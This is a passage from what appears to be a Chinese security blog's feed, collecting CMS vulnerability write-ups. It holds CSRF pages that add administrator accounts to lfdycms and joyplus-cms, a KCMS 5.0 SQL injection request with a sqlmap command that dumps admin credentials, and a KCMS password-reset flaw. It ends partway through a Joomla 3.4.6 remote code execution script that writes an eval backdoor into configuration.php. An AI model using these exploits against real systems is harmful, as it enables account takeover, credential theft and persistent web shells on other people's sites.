class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span>history.pushState('', '', '/')<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://10.211.55.17/lfdycms3.7.0/admin.php?s=/Users/add.html"</span> <span class="attr">method</span>=<span class="string">"POST"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"username"</span> <span class="attr">value</span>=<span class="string">"test222"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"email"</span> <span class="attr">value</span>=<span class="string">"test2@qq.com"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">value</span>=<span class="string">"test222"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"repassword"</span> <span class="attr">value</span>=<span class="string">"test222"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Submit request"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>通过CSRF增加管理员用户 的exp代码如下：  </p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span>history.pushState('', '', '/')<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://10.211.55.17/lfdycms3.7.0/admin.php?s=/Member/add.html"</span> <span class="attr">method</span>=<span class="string">"POST"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"username"</span> <span class="attr">value</span>=<span class="string">"admin2"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">value</span>=<span class="string">"admin2"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"repassword"</span> <span class="attr">value</span>=<span class="string">"admin2"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Submit request"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/KCMS/KCMS5.0%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5/KCMS5.0%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/KCMS/KCMS5.0%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5/KCMS5.0%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h4 id="漏洞详情："><a href="#漏洞详情：" class="headerlink" title="漏洞详情："></a>漏洞详情：</h4><p>漏洞出现在/ucenter/reg.php第7-19行:</p><pre><code>if(isset($_POST[&apos;submit&apos;])){$username = stripslashes(trim($_POST[&apos;name&apos;]));// 检测用户名是否存在$query = mysql_query(&quot;select u_id from mkcms_user where u_name=&apos;$username&apos;&quot;);if(mysql_fetch_array($query)){echo &apos;&lt;script&gt;alert(&quot;用户名已存在，请换个其他的用户名&quot;);window.history.go(-1);&lt;/script&gt;&apos;;exit;}$result = mysql_query(&apos;select * from mkcms_user where u_email = &quot;&apos;.$_POST[&apos;email&apos;].&apos;&quot;&apos;);if(mysql_fetch_array($result)){echo &apos;&lt;script&gt;alert(&quot;邮箱已存在，请换个其他的邮箱&quot;);window.history.go(-1);&lt;/script&gt;&apos;;exit;}</code></pre><p>注册用户名时$username参数传到后台后经过stripslashes()函数处理，而stripslashes()函数的作用是删除addslashes() 函数添加的反斜杠。这里就很郁闷了，过滤反斜杠干嘛？</p><p>当前页面无输出点，只是返回一个注册/未注册（通过if判断true或者false)，可以使用布尔盲注来解决这个问题</p><p>POC：</p><pre><code>POST /ucenter/reg.php HTTP/1.1Host: 127.0.0.1User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:65.0) Gecko/20100101 Firefox/65.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: enAccept-Encoding: gzip, deflateReferer: http://127.0.0.1/ucenter/reg.phpContent-Type: application/x-www-form-urlencodedContent-Length: 52Connection: closeCookie: PHPSESSID=cb8e6ccde6cf9050972fa9461d606be3Upgrade-Insecure-Requests: 1name=test&apos; AND 1=1 AND &apos;inject&apos;=&apos;inject&amp;email=sss%40qq.com&amp;password=ssssss&amp;submit=</code></pre><p><img src="KCMS5.0前台SQL注入/20190223150855-e20a10fc-3739-1.jpg" alt="1"></p><p>将POC中的数据包保存下来丢给sqlmap跑即可。</p><p>获取管理员账号：</p><pre><code>sqlmap -r inject.txt -D mkcms -T mkcms_manager --dump</code></pre><p><img src="KCMS5.0前台SQL注入/20190223150915-edf05c14-3739-1.jpg" alt="2"></p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://xz.aliyun.com/t/4189" target="_blank" rel="noopener">https://xz.aliyun.com/t/4189</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/KCMS/KCMS5.0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE/KCMS5.0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/KCMS/KCMS5.0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE/KCMS5.0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<h4 id="漏洞详情："><a href="#漏洞详情：" class="headerlink" title="漏洞详情："></a>漏洞详情：</h4><p>漏洞出现在<code>/ucenter/repass.php</code>第1-44行:</p><pre><code>&lt;?php include(&apos;../system/inc.php&apos;);if(isset($_SESSION[&apos;user_name&apos;])){header(&apos;location:index.php&apos;);};if(isset($_POST[&apos;submit&apos;])){$username = stripslashes(trim($_POST[&apos;name&apos;]));$email = trim($_POST[&apos;email&apos;]);// 检测用户名是否存在$query = mysql_query(&quot;select u_id from mkcms_user where u_name=&apos;$username&apos; and u_email=&apos;$email&apos;&quot;);if(!! $row = mysql_fetch_array($query)){$_data[&apos;u_password&apos;] = md5(123456);$sql = &apos;update mkcms_user set &apos;.arrtoupdate($_data).&apos; where u_name=&quot;&apos;.$username.&apos;&quot;&apos;;if (mysql_query($sql)) {$token =$row[&apos;u_question&apos;];include(&quot;emailconfig.php&quot;);//创建$smtp对象 这里面的一个true是表示使用身份验证,否则不使用身份验证.$smtp = new Smtp($MailServer, $MailPort, $smtpuser, $smtppass, true); $smtp-&gt;debug = false; $mailType = &quot;HTML&quot;; //信件类型，文本:text；网页：HTML$email = $email;  //收件人邮箱$emailTitle = &quot;&quot;.$mkcms_name.&quot;用户找回密码&quot;; //邮件主题$emailBody = &quot;亲爱的&quot;.$username.&quot;：&lt;br/&gt;感谢您在我站注册帐号。&lt;br/&gt;您的初始密码为123456&lt;br/&gt;如果此次找回密码请求非你本人所发，请忽略本邮件。&lt;br/&gt;&lt;p style=&apos;text-align:right&apos;&gt;-------- &quot;.$mkcms_name.&quot; 敬上&lt;/p&gt;&quot;;// sendmail方法// 参数1是收件人邮箱// 参数2是发件人邮箱// 参数3是主题（标题）// 参数4是邮件主题（标题）// 参数4是邮件内容  参数是内容类型文本:text 网页:HTML$rs = $smtp-&gt;sendmail($email, $smtpMail, $emailTitle, $emailBody, $mailType);if($rs==true){echo &apos;&lt;script&gt;alert(&quot;请登录到您的邮箱查看您的密码！&quot;);window.history.go(-1);&lt;/script&gt;&apos;;}else{echo &quot;找回密码失败&quot;;}}}}?&gt;</code></pre><p>本质上来说此处是一个逻辑问题，程序未通过邮箱等验证是否为用户本身就直接先在第13-14行把用户密码重置为123456了，根本没管邮件发送成功没有。</p><p><img src="KCMS5.0任意用户密码重置/20190223150934-f90753aa-3739-1.jpeg" alt></p><p>此处过滤了单引号，所以无法通过然后邮箱账号进行重置</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://xz.aliyun.com/t/4189" target="_blank" rel="noopener">https://xz.aliyun.com/t/4189</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/joyplusCMS/joyplus-cms%201.6.0%E5%AD%98%E5%9C%A8CSRF%E6%BC%8F%E6%B4%9E%E5%8F%AF%E5%A2%9E%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E6%88%B7/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/joyplusCMS/joyplus-cms%201.6.0%E5%AD%98%E5%9C%A8CSRF%E6%BC%8F%E6%B4%9E%E5%8F%AF%E5%A2%9E%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E6%88%B7/</url>
      
        <content type="html"><![CDATA[<h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><table><thead><tr><th></th><th>漏洞名称</th><th>上报日期</th><th>漏洞发现者</th><th>产品首页</th><th>软件链接</th><th>版本</th><th>CVE编号</th></tr></thead><tbody><tr><td></td><td>joyplus-cms 1.6.0存在CSRF漏洞可增加管理员账户</td><td>2018-03-14</td><td>yx（<a href="mailto:yx@5ecurity.cn" target="_blank" rel="noopener">yx@5ecurity.cn</a>）</td><td><a href="https://github.com/joyplus/joyplus-cms/" target="_blank" rel="noopener">https://github.com/joyplus/joyplus-cms/</a></td><td><a href="https://github.com/joyplus/joyplus-cms/" target="_blank" rel="noopener">https://github.com/joyplus/joyplus-cms/</a></td><td>1.6.0</td><td><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-8717" target="_blank" rel="noopener">CVE-2018-8717</a></td><td></td></tr></tbody></table><h4 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h4><blockquote><p>joyplus-cms 1.6.0存在CSRF漏洞，当管理员登陆后访问下面CSRF测试页面可将普通用户提成为管理员权限。joyplus-cms是一个在github上开源的CMS系统，漏洞发现者已经将漏洞信息通过<a href="https://github.com/joyplus/joyplus-cms/issues/419" target="_blank" rel="noopener">issues</a>告知作者。  </p></blockquote><h3 id="POC实现代码如下："><a href="#POC实现代码如下：" class="headerlink" title="POC实现代码如下："></a>POC实现代码如下：</h3><blockquote><p>CSRF测试页面代码如下：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span>history.pushState('', '', '/')<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://192.168.126.129/joyplus-cms-master/joyplus-cms/manager/admin_ajax.php?action=save&amp;tab=&#123;pre&#125;manager"</span> <span class="attr">method</span>=<span class="string">"POST"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"m<span class="symbol">&amp;#95;</span>id"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"flag"</span> <span class="attr">value</span>=<span class="string">"add"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"m<span class="symbol">&amp;#95;</span>name"</span> <span class="attr">value</span>=<span class="string">"admin1"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"m<span class="symbol">&amp;#95;</span>password"</span> <span class="attr">value</span>=<span class="string">"admin1"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"m<span class="symbol">&amp;#95;</span>status"</span> <span class="attr">value</span>=<span class="string">"1"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Submit request"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/Joomla/Joomla-3.4.6-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/Joomla/Joomla-3.4.6-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<h3 id="Joomla-3-4-6-RCE"><a href="#Joomla-3-4-6-RCE" class="headerlink" title="Joomla-3.4.6-RCE"></a><strong>Joomla-3.4.6-RCE</strong></h3><blockquote><p>exp author: twitter:@momika233<br>from :<a href="https://github.com/momika233/Joomla-3.4.6-RCE" target="_blank" rel="noopener">https://github.com/momika233/Joomla-3.4.6-RCE</a><br>Software Link: <a href="https://downloads.joomla.org/it/cms/joomla3/3-4-6" target="_blank" rel="noopener">https://downloads.joomla.org/it/cms/joomla3/3-4-6</a><br>Version: 3.0.0 –&gt; 3.4.6</p></blockquote><h3 id="POC-1"><a href="#POC-1" class="headerlink" title="POC 1"></a>POC 1</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">from</span> termcolor <span class="keyword">import</span> colored</span><br><span class="line"> </span><br><span class="line">PROXS = &#123;<span class="string">'http'</span>:<span class="string">'127.0.0.1:8080'</span>&#125;</span><br><span class="line">PROXS = &#123;&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">random_string</span><span class="params">(stringLength)</span>:</span></span><br><span class="line">        letters = string.ascii_lowercase</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span>.join(random.choice(letters) <span class="keyword">for</span> i <span class="keyword">in</span> range(stringLength))</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">backdoor_param = random_string(<span class="number">50</span>)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_info</span><span class="params">(str)</span>:</span></span><br><span class="line">        print(colored(<span class="string">"[*] "</span> + str,<span class="string">"cyan"</span>))</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_ok</span><span class="params">(str)</span>:</span></span><br><span class="line">        print(colored(<span class="string">"[+] "</span>+ str,<span class="string">"green"</span>))</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_error</span><span class="params">(str)</span>:</span></span><br><span class="line">        print(colored(<span class="string">"[-] "</span>+ str,<span class="string">"red"</span>))</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_warning</span><span class="params">(str)</span>:</span></span><br><span class="line">        print(colored(<span class="string">"[!!] "</span> + str,<span class="string">"yellow"</span>))</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_token</span><span class="params">(url, cook)</span>:</span></span><br><span class="line">        token = <span class="string">''</span></span><br><span class="line">        resp = requests.get(url, cookies=cook, proxies = PROXS)</span><br><span class="line">        html = BeautifulSoup(resp.text,<span class="string">'html.parser'</span>)</span><br><span class="line">        <span class="comment"># csrf token is the last input</span></span><br><span class="line">        <span class="keyword">for</span> v <span class="keyword">in</span> html.find_all(<span class="string">'input'</span>):</span><br><span class="line">                csrf = v</span><br><span class="line">        csrf = csrf.get(<span class="string">'name'</span>)</span><br><span class="line">        <span class="keyword">return</span> csrf</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_error</span><span class="params">(url, cook)</span>:</span></span><br><span class="line">        resp = requests.get(url, cookies = cook, proxies = PROXS)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Failed to decode session object'</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">                <span class="comment">#print(resp.text)</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="comment">#print(resp.text)</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_cook</span><span class="params">(url)</span>:</span></span><br><span class="line">        resp = requests.get(url, proxies=PROXS)</span><br><span class="line">        <span class="comment">#print(resp.cookies)</span></span><br><span class="line">        <span class="keyword">return</span> resp.cookies</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_pay</span><span class="params">(function, command)</span>:</span></span><br><span class="line">        <span class="comment"># Generate the payload for call_user_func('FUNCTION','COMMAND')</span></span><br><span class="line">        template = <span class="string">'s:11:"maonnalezzo":O:21:"JDatabaseDriverMysqli":3:&#123;s:4:"\\0\\0\\0a";O:17:"JSimplepieFactory":0:&#123;&#125;s:21:"\\0\\0\\0disconnectHandlers";a:1:&#123;i:0;a:2:&#123;i:0;O:9:"SimplePie":5:&#123;s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:&#123;&#125;s:5:"cache";b:1;s:19:"cache_name_function";s:FUNC_LEN:"FUNC_NAME";s:10:"javascript";i:9999;s:8:"feed_url";s:LENGTH:"PAYLOAD";&#125;i:1;s:4:"init";&#125;&#125;s:13:"\\0\\0\\0connection";i:1;&#125;'</span></span><br><span class="line">        <span class="comment">#payload =  command + ' || $a=\'http://wtf\';'</span></span><br><span class="line">        payload =  <span class="string">'http://l4m3rz.l337/;'</span> + command</span><br><span class="line">        <span class="comment"># Following payload will append an eval() at the enabled of the configuration file</span></span><br><span class="line">        <span class="comment">#payload =  'file_put_contents(\'configuration.php\',\'if(isset($_POST[\\\'test\\\'])) eval($_POST[\\\'test\\\']);\', FILE_APPEND) || $a=\'http://wtf\';'</span></span><br><span class="line">        function_len = len(function)</span><br><span class="line">        final = template.replace(<span class="string">'PAYLOAD'</span>,payload).replace(<span class="string">'LENGTH'</span>, str(len(payload))).replace(<span class="string">'FUNC_NAME'</span>, function).replace(<span class="string">'FUNC_LEN'</span>, str(len(function)))</span><br><span class="line">        <span class="keyword">return</span> final</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_req</span><span class="params">(url , object_payload)</span>:</span></span><br><span class="line">        <span class="comment"># just make a req with object</span></span><br><span class="line">        print_info(<span class="string">'Getting Session Cookie ..'</span>)</span><br><span class="line">        cook = get_cook(url)</span><br><span class="line">        print_info(<span class="string">'Getting CSRF Token ..'</span>)</span><br><span class="line">        csrf = get_token( url, cook)</span><br><span class="line"> </span><br><span class="line">        user_payload = <span class="string">'\\0\\0\\0'</span> * <span class="number">9</span></span><br><span class="line">        padding = <span class="string">'AAA'</span> <span class="comment"># It will land at this padding</span></span><br><span class="line">        working_test_obj = <span class="string">'s:1:"A":O:18:"PHPObjectInjection":1:&#123;s:6:"inject";s:10:"phpinfo();";&#125;'</span></span><br><span class="line">        clean_object = <span class="string">'A";s:5:"field";s:10:"AAAAABBBBB'</span> <span class="comment"># working good without bad effects</span></span><br><span class="line"> </span><br><span class="line">        inj_object = <span class="string">'";'</span></span><br><span class="line">        inj_object += object_payload</span><br><span class="line">        inj_object += <span class="string">'s:6:"return";s:102:'</span> <span class="comment"># end the object with the 'return' part</span></span><br><span class="line">        password_payload = padding + inj_object</span><br><span class="line">        params = &#123;</span><br><span class="line">            <span class="string">'username'</span>: user_payload,</span><br><span class="line">            <span class="string">'password'</span>: password_payload,</span><br><span class="line">            <span class="string">'option'</span>:<span class="string">'com_users'</span>,</span><br><span class="line">            <span class="string">'task'</span>:<span class="string">'user.login'</span>,</span><br><span class="line">            csrf :<span class="string">'1'</span></span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">        print_info(<span class="string">'Sending request ..'</span>)</span><br><span class="line">        resp  = requests.post(url, proxies = PROXS, cookies = cook,data=params)</span><br><span class="line">        <span class="keyword">return</span> resp.text</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_backdoor_pay</span><span class="params">()</span>:</span></span><br><span class="line">        <span class="comment"># This payload will backdoor the the configuration .PHP with an eval on POST request</span></span><br><span class="line"> </span><br><span class="line">        function = <span class="string">'assert'</span></span><br><span class="line">        template = <span class="string">'s:11:"maonnalezzo":O:21:"JDatabaseDriverMysqli":3:&#123;s:4:"\\0\\0\\0a";O:17:"JSimplepieFactory":0:&#123;&#125;s:21:"\\0\\0\\0disconnectHandlers";a:1:&#123;i:0;a:2:&#123;i:0;O:9:"SimplePie":5:&#123;s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:&#123;&#125;s:5:"cache";b:1;s:19:"cache_name_function";s:FUNC_LEN:"FUNC_NAME";s:10:"javascript";i:9999;s:8:"feed_url";s:LENGTH:"PAYLOAD";&#125;i:1;s:4:"init";&#125;&#125;s:13:"\\0\\0\\0connection";i:1;&#125;'</span></span><br><span class="line">        <span class="comment"># payload =  command + ' || $a=\'http://wtf\';'</span></span><br><span class="line">        <span class="comment"># Following payload will append an eval() at the enabled of the configuration file</span></span><br><span class="line">        payload =  <span class="string">'file_put_contents(\'configuration.php\',\'if(isset($_POST[\\\''</span> + backdoor_param +<span class="string">'\\\'])) eval($_POST[\\\''</span>+backdoor_param+<span class="string">'\\\']);\', FILE_APPEND) || $a=\'http://wtf\';'</span></span><br><span class="line">        function_len = len(function)</span><br><span class="line">        final = template.replace(<span class="string">'PAYLOAD'</span>,payload).replace(<span class="string">'LENGTH'</span>, str(len(payload))).replace(<span class="string">'FUNC_NAME'</span>, function).replace(<span class="string">'FUNC_LEN'</span>, str(len(function)))</span><br><span class="line">        <span class="keyword">return</span> final</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(url)</span>:</span></span><br><span class="line">        check_string = random_string(<span class="number">20</span>)</span><br><span class="line">        target_url = url + <span class="string">'index.php/component/users'</span></span><br><span class="line">        html = make_req(url, gen_pay(<span class="string">'print_r'</span>,check_string))</span><br><span class="line">        <span 